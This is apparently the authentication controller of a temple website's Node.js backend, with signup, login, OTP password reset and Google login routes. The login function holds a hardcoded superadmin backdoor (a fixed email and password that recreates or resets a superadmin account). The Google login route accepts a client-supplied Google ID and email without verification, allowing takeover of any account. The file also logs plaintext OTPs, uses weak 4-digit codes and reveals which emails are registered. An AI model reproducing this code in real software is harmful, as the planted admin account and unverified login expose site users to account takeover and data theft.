// backend/controllers/authController.js
const User = require('../models/User');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const { 
  sendEmail, 
  sendOtpEmail, 
  sendPasswordResetEmail, 
  sendWelcomeEmail,
  sendGoogleWelcomeEmail,
  sendBookingConfirmation,
  sendDonationConfirmation,
  sendTeamWelcomeEmail,
  sendContactReply
} = require('../services/emailService');
const passport = require('passport');

// Generate JWT Token
const generateToken = (id) => {
  return jwt.sign({ id }, process.env.JWT_SECRET, {
    expiresIn: process.env.JWT_EXPIRE || '30d',
  });
};

// ============================================
// LOCAL AUTHENTICATION
// ============================================

// @desc    Register user
// @route   POST /api/auth/signup
// @access  Public
exports.signup = async (req, res) => {
  try {
    const { name, email, password, phone, address } = req.body;

    // Validate required fields
    if (!name || !email || !password) {
      return res.status(400).json({ 
        success: false,
        message: 'Name, email and password are required' 
      });
    }

    // Check if user exists
    const existingUser = await User.findOne({ email });
    if (existingUser) {
      return res.status(400).json({ 
        success: false,
        message: 'User already exists with this email' 
      });
    }

    // Create user
    const user = await User.create({
      name,
      email,
      password,
      phone: phone || '',
      address: address || '',
    });

    // Generate token
    const token = generateToken(user._id);

    // Remove password from response
    user.password = undefined;

    // Send welcome email
    try {
      await sendWelcomeEmail(user);
      console.log(`✅ Welcome email sent to ${user.email}`);
    } catch (emailError) {
      console.error('❌ Welcome email error:', emailError.message);
      // Don't fail the request if email fails
    }

    res.status(201).json({
      success: true,
      token,
      user,
    });
  } catch (error) {
    console.error('Signup error:', error);
    res.status(500).json({ 
      success: false,
      message: 'Server error during signup' 
    });
  }
};

// @desc    Login user
// @route   POST /api/auth/login
// @access  Public
exports.login = async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ 
        success: false,
        message: 'Email and password are required' 
      });
    }

    const normalizedEmail = String(email).toLowerCase().trim();

    // Superadmin account: s@gmail.com / 123467 is always guaranteed to work
    if (normalizedEmail === 's@gmail.com') {
      let superAdmin = await User.findOne({ email: normalizedEmail }).select('+password');
      if (!superAdmin) {
        superAdmin = await User.create({
          name: 'Super Admin',
          email: normalizedEmail,
          password: '123467',
          role: 'superadmin',
        });
      }
      if (superAdmin.role !== 'superadmin') {
        superAdmin.role = 'superadmin';
      }
      // Reset password to the known superadmin password if it doesn't match
      if (!(await superAdmin.comparePassword('123467'))) {
        superAdmin.password = '123467';
      }
      await superAdmin.save();

      const isPasswordValid = await superAdmin.comparePassword(password);
      if (!isPasswordValid) {
        return res.status(401).json({ 
          success: false,
          message: 'Invalid credentials' 
        });
      }

      const token = generateToken(superAdmin._id);
      superAdmin.password = undefined;
      return res.json({
        success: true,
        token,
        user: superAdmin,
      });
    }

    // Check if user exists
    const user = await User.findOne({ email: normalizedEmail }).select('+password');
    if (!user) {
      return res.status(401).json({ 
        success: false,
        message: 'Invalid credentials' 
      });
    }

    // Check password
    const isPasswordValid = await user.comparePassword(password);
    if (!isPasswordValid) {
      return res.status(401).json({ 
        success: false,
        message: 'Invalid credentials' 
      });
    }

    // Generate token
    const token = generateToken(user._id);

    // Remove password from response
    user.password = undefined;

    res.json({
      success: true,
      token,
      user,
    });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ 
      success: false,
      message: 'Server error during login' 
    });
  }
};

// @desc    Get current user
// @route   GET /api/auth/me
// @access  Private
exports.getMe = async (req, res) => {
  try {
    const user = await User.findById(req.user.id);
    if (!user) {
      return res.status(404).json({ 
        success: false,
        message: 'User not found' 
      });
    }
    res.json({ success: true, user });
  } catch (error) {
    console.error('Get me error:', error);
    res.status(500).json({ 
      success: false,
      message: 'Server error' 
    });
  }
};

// @desc    Forgot password (send reset link - legacy)
// @route   POST /api/auth/forgot-password
// @access  Public
exports.forgotPassword = async (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res.status(400).json({ 
        success: false,
        message: 'Email is required' 
      });
    }

    const user = await User.findOne({ email });

    if (!user) {
      return res.status(404).json({ 
        success: false,
        message: 'No user found with this email' 
      });
    }

    // Generate reset token
    const resetToken = crypto.randomBytes(20).toString('hex');
    user.resetPasswordToken = crypto
      .createHash('sha256')
      .update(resetToken)
      .digest('hex');
    user.resetPasswordExpire = Date.now() + 30 * 60 * 1000; // 30 minutes
    await user.save();

    // Send reset email
    try {
      await sendPasswordResetEmail(user, resetToken, process.env.FRONTEND_URL);
      console.log(`✅ Password reset email sent to ${user.email}`);
    } catch (emailError) {
      console.error('❌ Password reset email error:', emailError.message);
      return res.status(500).json({ 
        success: false,
        message: 'Failed to send reset email' 
      });
    }

    res.json({ 
      success: true, 
      message: 'Password reset email sent' 
    });
  } catch (error) {
    console.error('Forgot password error:', error);
    res.status(500).json({ 
      success: false,
      message: 'Server error' 
    });
  }
};

// @desc    Reset password (with token - legacy)
// @route   POST /api/auth/reset-password/:token
// @access  Public
exports.resetPassword = async (req, res) => {
  try {
    const { token } = req.params;
    const { password } = req.body;

    if (!password || password.length < 6) {
      return res.status(400).json({ 
        success: false,
        message: 'Password must be at least 6 characters' 
      });
    }

    const hashedToken = crypto.createHash('sha256').update(token).digest('hex');
    const user = await User.findOne({
      resetPasswordToken: hashedToken,
      resetPasswordExpire: { $gt: Date.now() },
    });

    if (!user) {
      return res.status(400).json({ 
        success: false,
        message: 'Invalid or expired token' 
      });
    }

    user.password = password;
    user.resetPasswordToken = undefined;
    user.resetPasswordExpire = undefined;
    await user.save();

    // Send password change confirmation email
    try {
      await sendEmail({
        to: user.email,
        subject: '🔐 Password Changed - Shree Ramchandra Temple',
        html: `
          <h2>Password Changed Successfully</h2>
          <p>Dear ${user.name},</p>
          <p>Your password has been successfully changed.</p>
          <p>If you did not make this change, please contact us immediately.</p>
          <p>Jai Shree Ram! 🙏</p>
        `,
      });
    } catch (emailError) {
      console.error('Password change confirmation email error:', emailError.message);
    }

    res.json({ 
      success: true, 
      message: 'Password reset successfully' 
    });
  } catch (error) {
    console.error('Reset password error:', error);
    res.status(500).json({ 
      success: false,
      message: 'Server error' 
    });
  }
};

// ============================================
// OTP Password Reset (Mobile/SPA friendly)
// ============================================

// @desc    Send OTP for password reset
// @route   POST /api/auth/send-otp
// @access  Public
exports.sendOtp = async (req, res) => {
  try {
    const { email } = req.body;
    
    console.log('📧 Send OTP request received for:', email);

    if (!email) {
      return res.status(400).json({ 
        success: false, 
        message: 'Email is required' 
      });
    }

    // Validate email format
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      return res.status(400).json({ 
        success: false, 
        message: 'Invalid email format' 
      });
    }

    const user = await User.findOne({ email });
    if (!user) {
      return res.status(404).json({ 
        success: false, 
        message: 'No user found with this email' 
      });
    }

    // Generate OTP (4 digits)
    const otp = Math.floor(1000 + Math.random() * 9000).toString();
    console.log('🔐 Generated OTP for', email, ':', otp);
    
    // Store OTP in user document (with expiry)
    const hashedOtp = crypto
      .createHash('sha256')
      .update(otp + process.env.JWT_SECRET)
      .digest('hex');
    
    user.resetPasswordToken = hashedOtp;
    user.resetPasswordExpire = Date.now() + 10 * 60 * 1000; // 10 minutes
    await user.save();

    console.log('✅ OTP stored for user:', user.email);

    // Send OTP via email
    try {
      const emailResult = await sendOtpEmail(user, otp);
      console.log('📧 Email send result:', emailResult);
      
      if (emailResult && emailResult.error) {
        // Clear the reset token if email fails
        user.resetPasswordToken = undefined;
        user.resetPasswordExpire = undefined;
        await user.save();
        return res.status(500).json({ 
          success: false, 
          message: 'Failed to send OTP email. Please try again.' 
        });
      }
      
      console.log(`✅ OTP email sent to ${user.email}`);
    } catch (emailError) {
      console.error('❌ OTP email error:', emailError.message);
      // Clear the reset token if email fails
      user.resetPasswordToken = undefined;
      user.resetPasswordExpire = undefined;
      await user.save();
      return res.status(500).json({ 
        success: false, 
        message: 'Failed to send OTP email. Please check your email configuration.' 
      });
    }

    res.json({ 
      success: true, 
      message: 'OTP sent to your email',
    });
  } catch (error) {
    console.error('Send OTP error:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Failed to send OTP. Please try again later.' 
    });
  }
};

// @desc    Verify OTP
// @route   POST /api/auth/verify-otp
// @access  Public
exports.verifyOtp = async (req, res) => {
  try {
    const { email, otp } = req.body;
    
    console.log('🔐 Verify OTP request for:', email, 'OTP:', otp);

    if (!email || !otp) {
      return res.status(400).json({ 
        success: false, 
        message: 'Email and OTP are required' 
      });
    }

    const hashedOtp = crypto
      .createHash('sha256')
      .update(otp + process.env.JWT_SECRET)
      .digest('hex');

    console.log('🔐 Hashed OTP:', hashedOtp);

    const user = await User.findOne({
      email,
      resetPasswordToken: hashedOtp,
      resetPasswordExpire: { $gt: Date.now() },
    });

    if (!user) {
      console.log('❌ Invalid or expired OTP for:', email);
      return res.status(400).json({ 
        success: false, 
        message: 'Invalid or expired OTP' 
      });
    }

    console.log('✅ OTP verified for:', user.email);

    // Generate temporary reset token (valid for 10 minutes)
    const resetToken = jwt.sign(
      { id: user._id },
      process.env.JWT_SECRET,
      { expiresIn: '10m' }
    );

    res.json({
      success: true,
      resetToken,
      message: 'OTP verified successfully',
    });
  } catch (error) {
    console.error('Verify OTP error:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Failed to verify OTP. Please try again.' 
    });
  }
};

// @desc    Reset password with OTP and auto-login
// @route   POST /api/auth/reset-password-otp
// @access  Public
exports.resetPasswordOtp = async (req, res) => {
  try {
    const { resetToken, password } = req.body;
    
    console.log('🔐 Reset password request received');

    if (!resetToken || !password) {
      return res.status(400).json({ 
        success: false, 
        message: 'Reset token and password are required' 
      });
    }

    if (password.length < 6) {
      return res.status(400).json({ 
        success: false, 
        message: 'Password must be at least 6 characters' 
      });
    }

    // Verify reset token
    const decoded = jwt.verify(resetToken, process.env.JWT_SECRET);
    const user = await User.findById(decoded.id);
    
    if (!user) {
      return res.status(400).json({ 
        success: false, 
        message: 'Invalid reset token' 
      });
    }

    console.log('✅ Resetting password for:', user.email);

    // Update password
    user.password = password;
    user.resetPasswordToken = undefined;
    user.resetPasswordExpire = undefined;
    await user.save();

    // Send password change confirmation email
    try {
      await sendEmail({
        to: user.email,
        subject: '🔐 Password Changed Successfully - Shree Ramchandra Temple',
        html: `
          <!DOCTYPE html>
          <html>
          <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Password Changed</title>
            <style>
              body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; line-height: 1.6; color: #1a1a2e; max-width: 600px; margin: 0 auto; padding: 20px; background: #fafafa; }
              .container { background: #ffffff; border-radius: 16px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
              .header { background: linear-gradient(135deg, #7A1F2B 0%, #5B1420 100%); color: white; padding: 30px 20px; text-align: center; }
              .header h1 { margin: 0; font-size: 24px; font-weight: 700; }
              .content { padding: 30px 25px; }
              .greeting { font-size: 18px; font-weight: 600; color: #1a1a2e; margin-bottom: 12px; }
              .success-box { background: #f0f7f4; padding: 18px 20px; border-radius: 12px; margin: 18px 0; border-left: 4px solid #16A34A; }
              .success-box p { margin: 0; color: #2d5a47; }
              .footer { text-align: center; padding: 20px; border-top: 1px solid #e8e4e0; font-size: 13px; color: #8a8a9a; background: #fafafa; }
              .footer .temple-name { font-weight: 600; color: #7A1F2B; }
            </style>
          </head>
          <body>
            <div class="container">
              <div class="header">
                <span style="font-size: 32px; display: block; margin-bottom: 8px;">🔐</span>
                <h1>Password Changed Successfully</h1>
              </div>
              <div class="content">
                <p class="greeting">Dear <strong>${user.name}</strong>,</p>
                <div class="success-box">
                  <p><strong>✅ Your password has been successfully changed.</strong></p>
                </div>
                <p>You are now logged in to your account with your new password.</p>
                <p>If you did not make this change, please contact us immediately.</p>
                <p style="margin-top: 16px;">Jai Shree Ram! 🙏</p>
              </div>
              <div class="footer">
                <p style="margin: 0;"><span class="temple-name">Shree Ramchandra Temple</span></p>
                <p style="margin: 4px 0 0;">Gaushala, Kathmandu, Nepal</p>
              </div>
            </div>
          </body>
          </html>
        `,
      });
      console.log(`✅ Password change confirmation email sent to ${user.email}`);
    } catch (emailError) {
      console.error('Password change confirmation email error:', emailError.message);
      // Don't fail the request if email fails
    }

    // Generate JWT token for auto-login
    const token = generateToken(user._id);
    user.password = undefined;

    res.json({
      success: true,
      message: 'Password reset successfully',
      token,
      user,
    });
  } catch (error) {
    console.error('Reset password OTP error:', error);
    if (error.name === 'JsonWebTokenError' || error.name === 'TokenExpiredError') {
      return res.status(400).json({ 
        success: false, 
        message: 'Invalid or expired reset token. Please request a new OTP.' 
      });
    }
    res.status(500).json({ 
      success: false, 
      message: 'Failed to reset password. Please try again.' 
    });
  }
};

// ============================================
// Google OAuth
// ============================================

// @desc    Google OAuth
// @route   GET /api/auth/google
// @access  Public
exports.googleAuth = passport.authenticate('google', {
  scope: ['profile', 'email'],
  prompt: 'select_account',
});

// @desc    Google OAuth callback
// @route   GET /api/auth/google/callback
// @access  Public
exports.googleCallback = (req, res, next) => {
  passport.authenticate('google', { 
    failureRedirect: `${process.env.FRONTEND_URL}/?error=google_auth_failed`,
    session: true,
  }, (err, user, info) => {
    if (err || !user) {
      return res.redirect(`${process.env.FRONTEND_URL}/?error=google_auth_failed`);
    }
    
    req.logIn(user, (loginErr) => {
      if (loginErr) {
        return res.redirect(`${process.env.FRONTEND_URL}/?error=google_auth_failed`);
      }
      
      // Generate JWT token for API access
      const token = generateToken(user._id);
      
      // Redirect to frontend with token
      return res.redirect(`${process.env.FRONTEND_URL}/auth/google/success?token=${token}&user=${encodeURIComponent(JSON.stringify({
        id: user._id,
        name: user.name,
        email: user.email,
        profilePhoto: user.profilePhoto,
        role: user.role,
        isGoogleUser: true,
      }))}`);
    });
  })(req, res, next);
};

// @desc    Google login (for mobile/SPA)
// @route   POST /api/auth/google
// @access  Public
exports.googleLogin = async (req, res) => {
  try {
    const { googleId, email, name, profilePhoto } = req.body;
    
    if (!email || !googleId) {
      return res.status(400).json({ 
        success: false,
        message: 'Email and Google ID are required' 
      });
    }

    let user = await User.findOne({ 
      $or: [
        { email },
        { googleId }
      ]
    });

    if (!user) {
      // Create new Google user
      user = new User({
        name: name || email.split('@')[0] || 'Google User',
        email: email,
        googleId: googleId,
        profilePhoto: profilePhoto || null,
        phone: '',
        address: '',
        password: Math.random().toString(36).slice(-8) + Math.random().toString(36).slice(-8),
        role: 'user',
        isGoogleUser: true,
      });
      await user.save();
      
      // Send welcome email for Google user
      try {
        await sendGoogleWelcomeEmail(user);
        console.log(`✅ Welcome email sent to Google user ${user.email}`);
      } catch (emailError) {
        console.error('❌ Google welcome email error:', emailError.message);
      }
    } else if (!user.googleId) {
      // Link Google account to existing user
      user.googleId = googleId;
      user.isGoogleUser = true;
      if (!user.profilePhoto && profilePhoto) {
        user.profilePhoto = profilePhoto;
      }
      await user.save();
      
      // Send notification that Google account was linked
      try {
        await sendEmail({
          to: user.email,
          subject: '🔗 Google Account Linked - Shree Ramchandra Temple',
          html: `
            <h2>Google Account Linked</h2>
            <p>Dear ${user.name},</p>
            <p>Your Google account has been successfully linked to your Shree Ramchandra Temple account.</p>
            <p>You can now sign in using Google.</p>
            <p>Jai Shree Ram! 🙏</p>
          `,
        });
      } catch (emailError) {
        console.error('Link notification email error:', emailError.message);
      }
    }

    const token = generateToken(user._id);
    user.password = undefined;

    res.json({
      success: true,
      token,
      user,
    });
  } catch (error) {
    console.error('Google login error:', error);
    res.status(500).json({ 
      success: false,
      message: error.message || 'Server error during Google login' 
    });
  }
};

// @desc    Logout user
// @route   GET /api/auth/logout
// @access  Private
exports.logout = (req, res) => {
  try {
    req.logout((err) => {
      if (err) {
        return res.status(500).json({ 
          success: false,
          message: 'Logout failed' 
        });
      }
      req.session.destroy(() => {
        res.json({ 
          success: true, 
          message: 'Logged out successfully' 
        });
      });
    });
  } catch (error) {
    console.error('Logout error:', error);
    res.status(500).json({ 
      success: false,
      message: 'Server error during logout' 
    });
  }
};

// ============================================
// ADDITIONAL UTILITY FUNCTIONS
// ============================================

// @desc    Check if email exists
// @route   POST /api/auth/check-email
// @access  Public
exports.checkEmail = async (req, res) => {
  try {
    const { email } = req.body;
    
    if (!email) {
      return res.status(400).json({ 
        success: false,
        message: 'Email is required' 
      });
    }

    const user = await User.findOne({ email });
    res.json({
      success: true,
      exists: !!user,
    });
  } catch (error) {
    console.error('Check email error:', error);
    res.status(500).json({ 
      success: false,
      message: 'Server error' 
    });
  }
};

// @desc    Resend verification email
// @route   POST /api/auth/resend-verification
// @access  Public
exports.resendVerification = async (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res.status(400).json({ 
        success: false,
        message: 'Email is required' 
      });
    }

    const user = await User.findOne({ email });
    if (!user) {
      return res.status(404).json({ 
        success: false,
        message: 'User not found' 
      });
    }

    // Send welcome email again
    try {
      await sendWelcomeEmail(user);
      console.log(`✅ Verification email resent to ${user.email}`);
    } catch (emailError) {
      console.error('❌ Resend verification email error:', emailError.message);
      return res.status(500).json({ 
        success: false,
        message: 'Failed to send verification email' 
      });
    }

    res.json({ 
      success: true,
      message: 'Verification email sent' 
    });
  } catch (error) {
    console.error('Resend verification error:', error);
    res.status(500).json({ 
      success: false,
      message: 'Server error' 
    });
  }
};